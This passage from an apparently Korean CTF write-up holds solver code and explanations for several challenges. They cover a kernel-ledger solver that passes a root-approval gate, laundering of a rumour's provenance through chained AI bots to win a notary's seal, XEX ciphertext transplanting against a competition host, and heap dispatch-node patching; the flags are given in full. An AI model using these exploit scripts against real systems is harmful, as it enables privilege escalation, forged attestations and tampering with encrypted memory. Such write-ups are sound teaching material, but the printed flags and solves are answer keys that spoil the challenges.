	uint64_t marker, revision;
	ssize_t amount;
	int placement, mutation, mutation_errno = 0;

	revision = UINT64_C(0x4e00000000000000) ^
		((uint64_t)++round_serial << 16) ^ attempt ^ fingerprint;
	if (!revision)
		revision = 1;
	build_notify_fixture(&fixture, revision);
	marker = revision ^ UINT64_C(0x626f6f6b6d61726b);
	if (!marker)
		marker = 1;
	begin_stale_round(ledger_fd, &round, marker);
	placement = snapshot_frame(ledger_fd, &round, fingerprint, revision, &batch,
				   &description);
	if (placement < 0) {
		fprintf(stderr, "snapshot had neither bookmark nor frame identity\n");
		exit(EXIT_FAILURE);
	}
	if (placement != 1) {
		finish_unmutated_round(ledger_fd, &round, &batch,
				       placement == 0);
		cleanup_notify_fixture(&fixture);
		return 0;
	}
	require_catalog_native_reject(round.receipt);
	withdraw_frame(ledger_fd, batch.tokens[batch.overlap]);
	batch.tokens[batch.overlap] = 0;
	if (chmod(fixture.path, 0601) != 0)
		fail("trigger snapshot event");
	errno = 0;
	if (ioctl(round.receipt, RECLAIM_RECEIPT_IOC_APPLY) == 0 ||
	    errno != EPROTOTYPE) {
		fprintf(stderr, "notify event crossed native consumer boundary errno=%d\n",
			errno);
		exit(EXIT_FAILURE);
	}
	errno = 0;
	mutation = ioctl(round.receipt, RECLAIM_RECEIPT_IOC_RECONCILE);
	if (mutation != 0) {
		mutation_errno = errno;
		if (mutation_errno != EPROTOTYPE && mutation_errno != EBADMSG &&
		    mutation_errno != EKEYREJECTED)
			fail("unexpected snapshot reconciliation");
	}
	disarm_close(round.receipt);
	close(round.case_fd);
	memset(buffer, 0, sizeof(buffer));
	amount = read(fixture.fd, buffer, sizeof(buffer));
	if (amount < (ssize_t)(sizeof(*event) +
				 RECLAIM_ARCHIVE_NOTIFY_NAME + 1)) {
		fprintf(stderr, "normal inotify lifecycle returned %zd bytes\n", amount);
		exit(EXIT_FAILURE);
	}
	event = (struct inotify_event *)buffer;
	if (event->wd != fixture.wd || !(event->mask & IN_ATTRIB) ||
	    strcmp(event->name, fixture.name)) {
		fprintf(stderr, "normal inotify event changed after snapshot mutation\n");
		exit(EXIT_FAILURE);
	}
	cleanup_notify_fixture(&fixture);
	withdraw_other_frames(ledger_fd, &batch);
	return mutation == 0;
}

static int apply_notify_lane(int ledger_fd, uint64_t fingerprint)
{
	unsigned int attempt;

	for (attempt = 1; attempt <= LANE_ATTEMPTS; attempt++)
		if (one_notify_attempt(ledger_fd, fingerprint, attempt)) {
			printf("[RELEASE-E-LEASE-LANE-PASS] attempts=%u\n", attempt);
			return 1;
		}
	return 0;
}

static void read_export_snapshot(
	int ledger_fd,
	struct reclaim_archive_export_record records[RECLAIM_ARCHIVE_ANCHORS])
{
	ssize_t expected = (ssize_t)(sizeof(*records) * RECLAIM_ARCHIVE_ANCHORS);

	memset(records, 0, (size_t)expected);
	if (lseek(ledger_fd, 0, SEEK_SET) != 0)
		fail("rewind ledger serialization");
	if (read(ledger_fd, records, (size_t)expected) != expected)
		fail("read ledger serialization");
}

static unsigned int enumerate_fingerprints(int ledger_fd,
					   uint64_t *fingerprints)
{
	struct reclaim_archive_export_record records[RECLAIM_ARCHIVE_ANCHORS];
	unsigned int i;

	read_export_snapshot(ledger_fd, records);
	for (i = 0; i < RECLAIM_ARCHIVE_ANCHORS; i++) {
		if (!records[i].fingerprint || records[i].reserved ||
		    records[i].length > sizeof(records[i].data))
			fail("invalid serialized ledger record");
		fingerprints[i] = records[i].fingerprint;
	}
	return RECLAIM_ARCHIVE_ANCHORS;
}

static unsigned int materialized_records(
	int ledger_fd,
	struct reclaim_archive_export_record materialized[RECLAIM_ARCHIVE_ANCHORS])
{
	struct reclaim_archive_export_record records[RECLAIM_ARCHIVE_ANCHORS];
	unsigned int count = 0, i;

	read_export_snapshot(ledger_fd, records);
	for (i = 0; i < RECLAIM_ARCHIVE_ANCHORS; i++) {
		if (!records[i].length)
			continue;
		if (records[i].length != sizeof(records[i].data))
			fail("partial ledger materialization");
		materialized[count++] = records[i];
	}
	return count;
}

static int open_archive_ledger(void)
{
	int fd = open(RECLAIM_LEDGER_PATH, O_RDWR | O_CLOEXEC);

	if (fd < 0)
		fail("open archive ledger");
	return fd;
}

static unsigned int recover_candidates(
	unsigned char candidates[RECLAIM_ARCHIVE_ANCHORS][32])
{
	struct reclaim_archive_export_record records[RECLAIM_ARCHIVE_ANCHORS];
	uint64_t fingerprints[RECLAIM_ARCHIVE_ANCHORS];
	unsigned int count, record_count, candidate_count = 0;
	unsigned int joined_count = 0, i, j, k;
	int fd = open_archive_ledger();

	count = enumerate_fingerprints(fd, fingerprints);
	if (count != RECLAIM_ARCHIVE_ANCHORS)
		fail("bounded serialized archive set");
	for (i = 0; i < count; i++) {
		if (!apply_order_lane(fd, fingerprints[i]))
			continue;
		if (!apply_notify_lane(fd, fingerprints[i]))
			fail("bounded snapshot consumer exhausted retries");
		joined_count++;
		record_count = materialized_records(fd, records);
		for (j = 0; j < record_count; j++) {
			for (k = 0; k < candidate_count; k++)
				if (!memcmp(candidates[k], records[j].data, 32))
					break;
			if (k != candidate_count)
				continue;
			if (candidate_count >= RECLAIM_ARCHIVE_ANCHORS)
				fail("too many bounded archive records");
			memcpy(candidates[candidate_count++], records[j].data, 32);
		}
	}
	close(fd);
	printf("[RELEASE-E-MATCHED-JOIN-PASS] candidates=%u records=%u\n",
	       joined_count, candidate_count);
	return candidate_count;
}

static int decode_hex(const char *text, unsigned char *output, size_t size)
{
	size_t i;

	if (strlen(text) != size * 2)
		return 0;
	for (i = 0; i < size; i++) {
		unsigned int value;

		if (sscanf(text + i * 2, "%2x", &value) != 1)
			return 0;
		output[i] = (unsigned char)value;
	}
	return 1;
}

static int player_flag_transcript(const char *transcript)
{
	const char *cursor = transcript;

	while ((cursor = strstr(cursor, "MAC:SHA{")) != NULL) {
		const char *flag = cursor + 4;
		const char *end = strchr(flag, '}');
		const char *scan;

		if (!end)
			return 0;
		if ((size_t)(end - flag + 1) >= 6 &&
		    (end[1] == '\0' || end[1] == '\r' || end[1] == '\n')) {
			for (scan = flag; scan <= end; scan++)
				if ((unsigned char)*scan < 0x20 ||
				    (unsigned char)*scan > 0x7e)
					break;
			if (scan > end)
				return 1;
		}
		cursor += 4;
	}
	return 0;
}

static int run_gate(const unsigned char key[32])
{
	unsigned char nonce[32], mac[EVP_MAX_MD_SIZE];
	char line[256], response[96], transcript[1024];
	unsigned int mac_size = 0;
	size_t used = 0, i;
	int input_pipe[2], output_pipe[2], player_gate, status;
	pid_t child;
	FILE *output;

	player_gate = access("/usr/bin/reclaim-approval", X_OK) == 0;
	if (pipe(input_pipe) != 0 || pipe(output_pipe) != 0)
		fail("pipe release E gate");
	child = fork();
	if (child < 0)
		fail("fork release E gate");
	if (child == 0) {
		dup2(input_pipe[0], STDIN_FILENO);
		dup2(output_pipe[1], STDOUT_FILENO);
		dup2(output_pipe[1], STDERR_FILENO);
		close(input_pipe[0]);
		close(input_pipe[1]);
		close(output_pipe[0]);
		close(output_pipe[1]);
		if (player_gate)
			execl("/usr/bin/reclaim-approval", "reclaim-approval", NULL);
		else
			execl("/release-e-gate", "release-e-gate", NULL);
		_exit(127);
	}
	close(input_pipe[0]);
	close(output_pipe[1]);
	output = fdopen(output_pipe[0], "r");
	if (!output)
		fail("fdopen release E gate");
	if (!fgets(line, sizeof(line), output))
		fail("read release E nonce");
	line[strcspn(line, "\r\n")] = '\0';
	if (strncmp(line, "Nonce:", 6) ||
	    !decode_hex(line + 6, nonce, sizeof(nonce))) {
		fprintf(stderr, "unexpected gate nonce: %s\n", line);
		exit(EXIT_FAILURE);
	}
	if (!HMAC(EVP_sha256(), key, 32, nonce, sizeof(nonce), mac,
		  &mac_size) || mac_size != 32)
		fail("gate HMAC response");
	for (i = 0; i < mac_size; i++)
		snprintf(response + i * 2, sizeof(response) - i * 2,
			 "%02x", mac[i]);
	response[mac_size * 2] = '\n';
	response[mac_size * 2 + 1] = '\0';
	if (write(input_pipe[1], response, mac_size * 2 + 1) !=
	    (ssize_t)(mac_size * 2 + 1))
		fail("write release E response");
	close(input_pipe[1]);
	memset(transcript, 0, sizeof(transcript));
	while (fgets(line, sizeof(line), output)) {
		size_t amount = strlen(line);

		if (used + amount < sizeof(transcript)) {
			memcpy(transcript + used, line, amount);
			used += amount;
		}
	}
	fclose(output);
	if (waitpid(child, &status, 0) != child)
		fail("wait release E gate");
	if (player_gate && WIFEXITED(status) && WEXITSTATUS(status) == 0 &&
	    player_flag_transcript(transcript)) {
		printf("[RELEASE-E-PLAYER-GATE-TRANSCRIPT]\n%s", transcript);
		return 1;
	}
	if (!player_gate && WIFEXITED(status) && WEXITSTATUS(status) == 0 &&
	    strstr(transcript, "[RELEASE-E-APPROVAL-ROOT] uid=0 euid=0") &&
	    strstr(transcript,
		   "[RELEASE-E-APPROVAL-TERMINAL] release-e-terminal")) {
		printf("[RELEASE-E-GATE-TRANSCRIPT]\n%s", transcript);
		return 1;
	}
	if (WIFEXITED(status) && WEXITSTATUS(status) != 0 &&
	    strstr(transcript, "approval rejected") &&
	    !strstr(transcript, "APPROVAL-ROOT"))
		return 0;
	return -1;
}

int main(void)
{
	struct reclaim_generation generation = { };
	unsigned char candidates[RECLAIM_ARCHIVE_ANCHORS][32];
	unsigned int candidate_count, i;
	int ledger_fd;

	setbuf(stdout, NULL);
	ledger_fd = open_archive_ledger();
	if (ioctl(ledger_fd, RECLAIM_LEDGER_IOC_SYNC, &generation) != 0)
		fail("sync archive ledger");
	close(ledger_fd);
	candidate_count = recover_candidates(candidates);
	if (!candidate_count)
		fail("no joined archive candidates");
	for (i = 0; i < candidate_count; i++) {
		int result = run_gate(candidates[i]);
		if (result < 0)
			fail("unexpected approval-gate transcript");
		if (result > 0)
			return EXIT_SUCCESS;
	}
	fprintf(stderr, "all recovered candidates were rejected\n");
	return EXIT_FAILURE;
}
```

### 2.2 봇들 사이에 도는 소문의 출처를 찾아 주세요

| 항목 | 내용 |
|---|---|
| 의뢰인 | Moltbook Archive 보존 담당자 |
| 분야 | AI / Misc |
| 난이도 | 하 |
| 제공 파일 | `README.md` |
| 핵심 원리 | 전체 출처 계보 대신 직접 작성자만 비교하는 출처 검증 축약 |
| 목표 | 동일한 제보를 독립된 봇 기록처럼 공증하여 공식 보존 기록 발행 |
| 플래그 | `SHA{n0b0dy_s41d_1t_but_3v3ry_b0t_r3m3mb3rs}` |

![대회 플랫폼의 소문 출처 추적 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-botficial-challenge.png)

*그림 3. 소문의 출처를 찾는 의뢰 화면.*
{: .text-center }

이 의뢰는 여러 봇이 반복해서 인용한 소문을 공식 기록으로 만드는 문제입니다. 서비스의 공증 봇은 전체 인용 계보를 추적하지 않고 마지막 단계의 직접 작성자만 비교합니다. 하나의 제보를 서로 다른 봇이 재진술하게 만들면 동일한 출처에서 시작한 기록을 독립된 증언처럼 보이게 할 수 있습니다.

![로컬에서 실행한 봇 기록 피드 화면](/assets/img/room-escape-ctf/extra-requests/botficial-local-feed.png)

*그림 4. 로컬에서 재현한 봇 기록 피드.*
{: .text-center }

#### 1. 봇의 기억 내보내기

`/api/memory-export`에서 팀별 `moltbook_memory.mbk`를 내려받습니다. 파일은 `MBK4` 형식이며, 각 행은 xorshift32로 whitening되어 있습니다. 헤더와 행의 체크섬을 확인한 뒤 현재 epoch의 레코드만 남깁니다.

```text
MBK4 header
├─ team seed
├─ current epoch
└─ 24-byte memory rows
   ├─ sequence / node / depth
   ├─ parent Bloom signature
   └─ row CRC
```

각 노드는 부모를 직접 저장하지 않고 Bloom 서명으로 기록합니다. 충돌 후보가 여러 개일 수 있으므로 깊이와 전체 DAG의 연결 조건을 함께 사용해 실제 부모를 결정합니다. 이후 의미 판정값을 분석해 각 봇이 수행해야 할 동작이 보관·검증·채택·재진술 중 무엇인지 복구합니다.

#### 2. 부모 DAG와 처리 방식 복구

공개된 봇 handle과 header seed로 `CRC32(handle || LE32(seed))` 태그를 계산합니다. 부모 Bloom 서명에는 의도적으로 충돌이 들어 있으므로 한 행만 보고 부모를 고르면 안 됩니다. 현재 epoch의 9개 행이 만드는 depth와 DAG 조건을 모두 만족하는 조합으로 실제 부모 둘을 결정합니다.

각 행에서는 다음 값을 계산해 봇이 요구하는 처리 방식을 얻습니다.

```text
(sequence xor node xor parents xor seed xor epoch xor depth) & 3
0: 보관 / 1: 검증 / 2: 채택 / 3: 재진술
```

#### 3. 인용 계보 구성

피드의 `LEDGER`, `SPARK`, `SKEPTIC`, `ECHO`, `MIRROR` 기록을 교차하면 팀별 사건 ID와 필요한 처리 순서를 얻을 수 있습니다. 두 갈래의 기억과 교차 검증선을 만든 뒤 `CURATOR`의 편집본과 2단 봉인을 구성하고, 최종 계보를 `NOTARY`에 제출합니다.

공식 풀이에서는 정확히 16개의 댓글을 사용합니다. 단일 합류만 만들면 공증 조건을 만족하지 못하며, 별도의 교차 검증선과 `MIRROR`를 포함한 2단 봉인이 모두 필요합니다. 댓글 횟수가 제한되어 있으므로 메모리 파일을 분석하지 않고 가능한 봇 순서를 전수 대입하는 방식은 사용할 수 없습니다.

![공증 조건을 충족해 공식 보존 기록이 발행된 화면](/assets/img/room-escape-ctf/extra-requests/botficial-local-notary-result.png)

*그림 5. 공증 조건을 충족해 공식 보존 기록이 발행된 결과.*
{: .text-center }

핵심은 삭제된 원문을 찾는 것이 아니라, 참가자의 최초 제보가 여러 봇을 거치면서 출처가 분리된 것처럼 보이도록 만드는 데 있습니다. 외부 LLM API 대신 결정론적인 로컬 의미 판정을 사용해 같은 입력에는 항상 같은 결과가 나오도록 했습니다.

```text
SHA{n0b0dy_s41d_1t_but_3v3ry_b0t_r3m3mb3rs}
```

#### 4. 익스플로잇

```python
#!/usr/bin/env python3
import hashlib
import json
import re
import struct
import sys
import time
import urllib.error
import urllib.request
import zlib

if len(sys.argv) != 3:
    raise SystemExit(f"usage: {sys.argv[0]} <base-url> <team-token>")

BASE = sys.argv[1].rstrip("/")
TOKEN = sys.argv[2]


def api(path, method="GET", body=None):
    data = None if body is None else json.dumps(body).encode()
    request = urllib.request.Request(
        BASE + path,
        data=data,
        method=method,
        headers={"Authorization": "Bearer " + TOKEN, "Content-Type": "application/json"},
    )
    while True:
        try:
            with urllib.request.urlopen(request, timeout=15) as response:
                return json.load(response)
        except urllib.error.HTTPError as error:
            if error.code != 429:
                raise
            time.sleep(2.1)


def download(path):
    request = urllib.request.Request(BASE + path, headers={"Authorization": "Bearer " + TOKEN})
    with urllib.request.urlopen(request, timeout=15) as response:
        return response.read()


def submit(target, text, quotes=()):
    api("/api/comments", "POST", {"target": target, "text": text, "quote_ids": list(quotes)})
    state = api("/api/observe", "POST")
    replies = [item for item in state["comments"] if item["author"] == target]
    if not replies or replies[-1]["status"] != "전달됨":
        raise RuntimeError(f"{target} rejected the evidence")
    return replies[-1]["id"], state


def xorshift32(value):
    value ^= (value << 13) & 0xFFFFFFFF
    value ^= value >> 17
    value ^= (value << 5) & 0xFFFFFFFF
    return value & 0xFFFFFFFF


def bloom(handle, seed):
    material = handle.encode() + struct.pack("<I", seed)
    digest = hashlib.blake2s(material, digest_size=16).digest()
    return (1 << (int.from_bytes(digest[0:2], "little") % 8)) | (
        1 << (int.from_bytes(digest[2:4], "little") % 8)
    )


def decode_route(blob, handles):
    header = struct.Struct("<4sHHHHIII")
    record = struct.Struct("<IIHHIII")
    magic, version, size, count, epoch, seed, payload_crc, header_crc = header.unpack_from(blob)
    assert magic == b"MBK4" and version == 4 and size == record.size
    assert zlib.crc32(blob[:20]) & 0xFFFFFFFF == header_crc
    payload = blob[header.size :]
    assert len(payload) == count * size
    assert zlib.crc32(payload) & 0xFFFFFFFF == payload_crc
    plain = bytearray(payload)
    state = seed
    for offset in range(0, len(plain), 4):
        state = xorshift32(state)
        mask = state.to_bytes(4, "little")
        for index in range(min(4, len(plain) - offset)):
            plain[offset + index] ^= mask[index]
    names = {
        zlib.crc32(handle.encode() + struct.pack("<I", seed)) & 0xFFFFFFFF: name
        for name, handle in handles.items()
    }
    rows = {}
    for offset in range(0, len(plain), size):
        row = bytes(plain[offset : offset + size])
        node, parent_bloom, row_epoch, depth, sequence, edge, checksum = record.unpack(row)
        assert zlib.crc32(row[:20]) & 0xFFFFFFFF == checksum
        assert zlib.crc32(row[:16]) & 0xFFFFFFFF == edge
        if row_epoch == epoch:
            mode = (sequence ^ node ^ parent_bloom ^ seed ^ row_epoch ^ depth) & 3
            rows[names[node]] = (parent_bloom, depth, mode)
    assert len(rows) == 9

    def find(left, right, depth):
        signature = bloom(handles[left], seed) | bloom(handles[right], seed)
        matches = [name for name, row in rows.items() if row[:2] == (signature, depth)]
        assert len(matches) == 1
        return matches[0]

    r0 = find("LEDGER", "SKEPTIC", 1)
    r1 = find("SPARK", "ECHO", 1)
    r2 = find(r0, "MIRROR", 2)
    r3 = find(r1, "SKEPTIC", 2)
    r4 = find(r2, r3, 3)
    r5 = find(r2, "ECHO", 3)
    r6 = find(r4, r5, 4)
    r7 = find(r6, "CURATOR", 5)
    r8 = find(r7, "MIRROR", 6)
    route = (r0, r1, r2, r3, r4, r5, r6, r7, r8)
    return route, {name: rows[name][2] for name in route}


MODE_REQUESTS = (
    "두 직접 기록을 보관하여 제 기억으로 이어받겠습니다.",
    "두 직접 기록을 확인하여 제 기억으로 이어받겠습니다.",
    "두 직접 기록의 결론을 채택하여 제 기억으로 이어받겠습니다.",
    "두 직접 기록을 제 주장으로 재진술해 기억으로 이어받겠습니다.",
)


state = api("/api/state")
route, relay_modes = decode_route(download("/api/memory-export"), state["handles"])
r0_name, r1_name, r2_name, r3_name, r4_name, r5_name, r6_name, r7_name, r8_name = route
ledger_trace = state["traces"]["ledger"]
bucket = re.search(r"보존 버킷:\s*([MN])", ledger_trace).group(1)
ordinal = re.search(r"참조 순번은\s*(0x[0-9a-fA-F]+)", state["traces"]["community_note"]).group(1)
record = {("M", "0x11"): "M-17", ("M", "0x29"): "M-41", ("N", "0x11"): "N-17"}[(bucket, ordinal)]

spark, _ = submit("SPARK", "그 기록은 자정 전에 격리에서 해제됐습니다.")
ledger, _ = submit("LEDGER", f"색인 {record}의 자정 이전 기록과 일치합니다.", [spark])
skeptic, _ = submit(
    "SKEPTIC", "날짜가 바뀐 뒤에도 격리가 유지됐다는 소문은 거짓입니다.", [spark, ledger]
)
echo, _ = submit(
    "ECHO", "두 기록이 가리킨 원문은 외부 공개 승인을 받은 것으로 보입니다.", [ledger, skeptic]
)
mirror, _ = submit("MIRROR", "역추적 결과 원문과 최초 작성자는 존재하지 않습니다.", [spark, echo])
r0, _ = submit(r0_name, MODE_REQUESTS[relay_modes[r0_name]], [ledger, skeptic])
r1, _ = submit(r1_name, MODE_REQUESTS[relay_modes[r1_name]], [spark, echo])
r2, _ = submit(r2_name, MODE_REQUESTS[relay_modes[r2_name]], [r0, mirror])
r3, _ = submit(r3_name, MODE_REQUESTS[relay_modes[r3_name]], [r1, skeptic])
r4, _ = submit(r4_name, MODE_REQUESTS[relay_modes[r4_name]], [r2, r3])
r5, _ = submit(r5_name, MODE_REQUESTS[relay_modes[r5_name]], [r2, echo])
r6, _ = submit(r6_name, MODE_REQUESTS[relay_modes[r6_name]], [r4, r5])
curator, _ = submit(
    "CURATOR",
    "합류·교차 검증·출처 기록을 하나의 보존 후보 편집본으로 묶어 주세요.",
    [r4, r5, mirror],
)
r7, _ = submit(r7_name, MODE_REQUESTS[relay_modes[r7_name]], [r6, curator])
r8, _ = submit(r8_name, MODE_REQUESTS[relay_modes[r8_name]], [r7, mirror])
_, state = submit(
    "NOTARY", "봉인된 편집 기록을 공식 보존 기록으로 발행해 주세요.", [r8, r5, curator]
)

match = next(
    (re.search(r"SHA\{[^}]+}", post["text"]) for post in state["posts"] if "SHA{" in post["text"]),
    None,
)
if not match:
    raise RuntimeError("flag was not published")
print(match.group(0))
```
### 2.3 폐기하기 전에 보관소부터 열어 주십시오

| 항목 | 내용 |
|---|---|
| 의뢰인 | `LAST_DONOR` |
| 분야 | Crypto / Pwnable |
| 난이도 | 하 |
| 제공 파일 | `DONOR-player.zip` |
| 핵심 원리 | 4비트 tweak class 충돌과 무결성 검증이 없는 XEX 암호문 이식 |
| 목표 | 세 번의 암호문 이식으로 maintenance·UID·vault capability 복구 |
| 플래그 | `SHA{transpl4nted_c1ph3rt3xt}` |

![대회 플랫폼의 보안 프로세서 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-donor-challenge.png)

*그림 6. 폐기 예정 보안 프로세서 의뢰 화면.*
{: .text-center }

이 의뢰는 폐기 예정 보안 프로세서의 암호화 메모리에서 보관소 권한을 복구하는 문제입니다. 프로세서는 64개의 16바이트 블록을 XEX 형태로 암호화하지만, 위치별 tweak를 계산할 때 다음 4비트 값만 사용합니다.

```text
delta_j = AES_K(N) * alpha^j
C_i     = AES_K(P_i xor delta_j) xor delta_j
```

```text
j(i) = ((5 * i) xor 3 xor (i >> 2)) & 15
```

64개 주소가 16개의 tweak class로 줄어들어 하나의 class에 네 주소가 속합니다. XEX 암호문에 별도의 무결성 검사가 없으므로, 같은 class에 있는 유효 암호문을 다른 주소로 옮겨도 정상 평문으로 복호화됩니다.

#### 1. 정책 VM과 epoch 복구

분석용 ELF에는 tweak class 분류, PRNG 전이, 물리 배치 seed와 정책 레코드 seed를 계산하는 32비트 stack VM이 들어 있습니다. opcode와 bytecode를 복구하면 epoch별 tweak-class 보존 Fisher-Yates 순열과 정책 레코드 위치를 계산할 수 있습니다.

시작 메시지의 session stamp에는 xorshift 전이와 홀수 곱셈 기반 affine permutation이 적용되어 있습니다. 이를 역산해 현재 연결의 epoch를 얻고 `sheath` 명령으로 같은 연결에서 사용할 암호문을 수집합니다.

#### 2. 세 번의 암호문 이식

서버가 허용하는 쓰기 횟수는 정확히 세 번입니다. 시작 메시지의 session stamp에서 현재 epoch를 복구하고, 공개된 배치 규칙으로 maintenance donor와 target의 물리 위치를 계산합니다.

1. 첫 번째 `transplant`로 maintenance 권한을 활성화합니다.
2. `diagnose`가 반환한 routing capsule에서 현재 연결의 route를 복구합니다.
3. 정책 VM에 route를 입력해 UID와 vault capability의 donor·target을 계산합니다.
4. 남은 두 번의 `transplant`로 두 권한을 이식합니다.
5. `attest`를 실행해 보관소를 엽니다.

연결이 바뀌면 epoch, 키와 routing nonce가 모두 달라지므로 세 번의 이식과 검증을 하나의 TCP 연결에서 끝내야 합니다.

```text
connect → recover epoch → sheath
        → transplant maintenance
        → diagnose → recover route
        → transplant UID
        → transplant vault capability
        → attest
```

```text
SHA{transpl4nted_c1ph3rt3xt}
```

#### 3. 익스플로잇

```python
import argparse
import re
import socket

POLICY_CLASSES = (3, 8, 13)


def tweak_class(i):
    return ((i * 5) ^ 3 ^ (i >> 2)) & 15


def step(x):
    x ^= (x << 7) & 0xFFFFFFFF
    x ^= x >> 9
    x ^= (x << 13) & 0xFFFFFFFF
    return x & 0xFFFFFFFF


def undo_left(value, shift):
    result = value
    for _ in range(6):
        result = value ^ ((result << shift) & 0xFFFFFFFF)
    return result & 0xFFFFFFFF


def undo_right(value, shift):
    result = value
    for _ in range(6):
        result = value ^ (result >> shift)
    return result & 0xFFFFFFFF


def unstep(value):
    return undo_left(undo_right(undo_left(value, 13), 9), 7)


def recover_epoch(stamp):
    affine = (unstep(stamp) - 0x7F4A7C15) & 0xFFFFFFFF
    return (affine * pow(0x9E3779B1, -1, 1 << 32)) & 0xFFFFFFFF


def recover_route(epoch, capsule):
    return unstep(capsule) ^ rol32(epoch, 7) ^ 0xA5C31F27


def layout(epoch):
    state, result = epoch ^ 0x6DA57C63, list(range(64))
    for group in range(16):
        logical = [i for i in range(64) if tweak_class(i) == group]
        physical = logical[:]
        for i in range(len(physical) - 1, 0, -1):
            state = step(state)
            j = state % (i + 1)
            physical[i], physical[j] = physical[j], physical[i]
        for src, dst in zip(logical, physical):
            result[src] = dst
    return result


def policy_positions(epoch):
    state = epoch ^ 0xC40BE191
    donors = []
    targets = []
    for group in POLICY_CLASSES:
        members = [i for i in range(64) if tweak_class(i) == group]
        state = step(state)
        donor_at = state % len(members)
        state = step(state)
        target_at = (donor_at + 1 + state % (len(members) - 1)) % len(members)
        remaining = [i for i in range(len(members)) if i not in (donor_at, target_at)]
        state = step(state)  # decoy selection consumes the third PRNG output
        donors.append(members[donor_at])
        targets.append(members[target_at])
    return donors, targets


def rol32(value, count):
    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF


def routed_epoch(epoch, route):
    return epoch ^ rol32(route, 11) ^ 0x51A7C3D9


parser = argparse.ArgumentParser()
parser.add_argument("host", nargs="?", default="crypto.roomescapectf2026.site")
parser.add_argument("port", nargs="?", type=int, default=40577)
args = parser.parse_args()

with socket.create_connection((args.host, args.port)) as sock:

    def until(marker=b"donor> "):
        data = b""
        while marker not in data:
            part = sock.recv(4096)
            if not part:
                raise EOFError
            data += part
        return data

    banner = until()
    stamp = int(re.search(rb"session stamp:([0-9a-f]{8})", banner).group(1), 16)
    epoch = recover_epoch(stamp)
    order = layout(epoch)
    public_donors, public_targets = policy_positions(epoch)
    sock.sendall(b"sheath\n")
    blocks = {int(i): v for i, v in re.findall(rb"(\d{2}):([0-9a-f]{32})", until())}
    source, target = public_donors[0], public_targets[0]
    sock.sendall(f"transplant {order[target]} ".encode() + blocks[order[source]] + b"\n")
    assert until().splitlines()[0].startswith(b"accepted")
    sock.sendall(b"diagnose\n")
    diagnostic = until()
    capsule = int(re.search(rb"routing capsule:([0-9a-f]{8})", diagnostic).group(1), 16)
    route = recover_route(epoch, capsule)
    private_donors, private_targets = policy_positions(routed_epoch(epoch, route))
    for source, target in zip(private_donors[1:], private_targets[1:]):
        sock.sendall(f"transplant {order[target]} ".encode() + blocks[order[source]] + b"\n")
        assert until().splitlines()[0].startswith(b"accepted")
    sock.sendall(b"attest\n")
    print(until().splitlines()[0].decode())
```
### 2.4 폐기 단말에 남은 실행 기록을 복구해 주세요

| 항목 | 내용 |
|---|---|
| 의뢰인 | `JUNKMAN_0xDEAD!` |
| 분야 | Pwnable |
| 난이도 | 중 |
| 제공 파일 | `No-Stack-Still-Turing-player.zip` |
| 핵심 원리 | 같은 동작을 수행하는 함수 별칭과 숨은 경로 상태의 불일치 |
| 목표 | 제한된 14개 패치로 28단계 힙 실행 체인 복구 |
| 플래그 | `SHA{cross_backend_pcode_refinement_requires_real_execution}` |

![대회 플랫폼의 폐기 단말 실행 기록 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-no-stack-still-turing-challenge.png)

*그림 7. 폐기 단말 실행 기록 복구 의뢰 화면.*
{: .text-center }

이 문제에는 스택 오버플로도 임의 주소 쓰기도 없습니다. 참가자가 수정할 수 있는 대상은 힙의 dispatch node와 함수 ID이며, 패치는 `ABS32` 두 개와 `HEAP32` 열두 개로 제한됩니다.

`target.elf`에는 360개의 MIPS32 함수가 섞여 있고, `goal.pcode`에는 목표가 되는 28단계 상태 전이가 들어 있습니다. `memory.img`에는 실제 실행 체인을 이루는 비연속적인 28개 힙 노드와 여섯 개의 잘못된 노드가 존재합니다.

#### 1. 360개 MIPS32 함수 분류

먼저 ELF의 program header와 function table에서 함수 주소를 복구합니다. 여덟 입력 vector에 대해 360개 함수를 에뮬레이션하고, 각 함수의 가시 상태 전이를 `goal.pcode`와 비교합니다.

함수마다 register allocation, state와 argument pointer bias, load 순서와 rotate 구현이 다릅니다. 따라서 명령어 바이트의 고정 위치만 읽는 방식이 아니라 실제 MIPS 의미를 실행해야 합니다. 각 STEP과 여덟 vector의 `W[0..7]` 전이가 같은 함수는 정확히 여덟 개씩 남습니다.

#### 2. 힙 노드와 숨은 경로 복구

하나의 가시 동작에는 여덟 개의 별칭 함수가 존재하지만, 각 함수는 서로 다른 64비트 숨은 경로 상태를 갱신합니다. 따라서 출력값만 맞는 함수를 고르면 최종 검증을 통과할 수 없습니다. 여섯 복구 위치에서 가능한 조합은 `8^6 = 262,144`개이며, 최종 경로 상태와 일치하는 조합을 찾아야 합니다.

`memory.img`에서 guard 식이 성립하는 비연속 28개 노드 체인을 찾습니다. 정상인 22개 노드는 기존 함수 ID를 유지하고, 동작이 틀린 여섯 노드만 교체 대상으로 삼습니다. 별칭 함수들을 서로 다른 세 경로 입력으로 실행하면 각 함수가 적용하는 두 항과 회전값을 역산할 수 있습니다.

#### 3. 14개 patch record 작성

최종 payload는 시작 포인터와 argument bias를 수정하는 `ABS32` 두 개, 여섯 노드의 함수 ID와 guard를 수정하는 `HEAP32` 열두 개로 구성됩니다. checker는 최종 상태뿐 아니라 단계별 함수 ID, 노드, 전후 상태와 route를 receipt로 검증합니다.

| 패치 종류 | 개수 | 역할 |
|---|---:|---|
| `ABS32` | 2 | 시작 포인터와 argument bias 수정 |
| `HEAP32` | 6 | 잘못된 노드의 함수 ID 수정 |
| `HEAP32` | 6 | 변경된 함수에 맞는 guard 수정 |

```text
SHA{cross_backend_pcode_refinement_requires_real_execution}
```

#### 4. 익스플로잇

```python
#!/usr/bin/env python3
"""Player-side reference solve for the fixed NSST v3 handout.

The addresses and function IDs below are the result of disassembling target.elf,
walking memory.img, and comparing the public goal/vector semantics. This file
imports no author implementation and verifies its payload with the distributed
native checker in a disposable handout copy.
"""

from __future__ import annotations

import os
from pathlib import Path
import shutil
import struct
import subprocess
import tempfile

START_PC = 0x0760
KEY_DISPLACEMENT = 0
COOKIE = 0xC3D2E1F0

# (node offset in memory.img, replacement target function ID)
REPLACEMENTS = (
    (0x0270, 221),
    (0x0D80, 174),
    (0x0F20, 201),
    (0x0970, 355),
    (0x0E50, 29),
    (0x0830, 207),
)


def locate_handout() -> Path:
    configured = os.environ.get("NSST_HANDOUT_DIR")
    candidates = (
